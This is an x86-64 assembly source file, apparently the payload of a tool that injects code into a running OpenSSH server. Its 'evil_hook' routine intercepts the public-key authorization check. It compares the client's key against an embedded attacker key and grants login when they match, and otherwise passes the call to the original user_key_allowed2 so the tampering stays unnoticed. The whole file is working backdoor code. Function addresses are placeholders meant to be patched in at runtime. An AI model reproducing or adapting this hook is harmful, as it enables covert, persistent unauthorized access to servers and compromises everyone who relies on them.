.global evil_hook, evil_hook_size

hook_start:
# preserve arguments
push %rdi
push %rdx
push %rcx
push %r8
push %r9
push %rsi
push %rsi

# found = key_new(key->type); // 1 == TYPE_RSA
mov $1, %rdi
mov $0xaaaaaaaabbbbbbbb, %rax
callq *%rax
lea found(%rip), %rsi
mov %rax, (%rsi)

# cc = evil_key
lea evil_key(%rip), %rax
lea cc(%rip), %rsi
mov %rax, (%rsi)

# key_read(found, &cc)
lea found(%rip), %rdi
mov (%rdi), %rdi
lea cc(%rip), %rsi

mov $0x1111111122222222, %rax
callq *%rax

# rdi = found
lea found(%rip), %rdi
mov (%rdi), %rdi

# rsi = key (from orig arg stack)
pop %rsi

# key_equals
mov $0x3333333344444444, %rax
callq *%rax
cmp $1, %rax
jnz backdoor_fail
key_equal:
	# restore_uid();
	mov $0x99999999aaaaaaaa, %rax
	callq *%rax

	# key_free(found);
	#lea found(%rip), %rdi
	#mov (%rdi), %rdi
	#mov $0x5555555566666666, %rax
	#callq *%rax

	# return 1;
	pop %rsi
	pop %r9
	pop %r8
	pop %rcx
	pop %rdx
	pop %rdi
	mov $1, %rax
	ret


backdoor_fail:
# restore arguments
pop %rsi
pop %r9
pop %r8
pop %rcx
pop %rdx
pop %rdi

# return user_key_allowed2(pw, key, file);
mov $0x7777777788888888, %rax
call *%rax

ret

found:
.quad 0x0000000000000000
cc:
.quad 0x0000000000000000

evil_key:

evil_hook_size:
.quad	(evil_hook_size - hook_start)
evil_hook:
.quad	hook_start

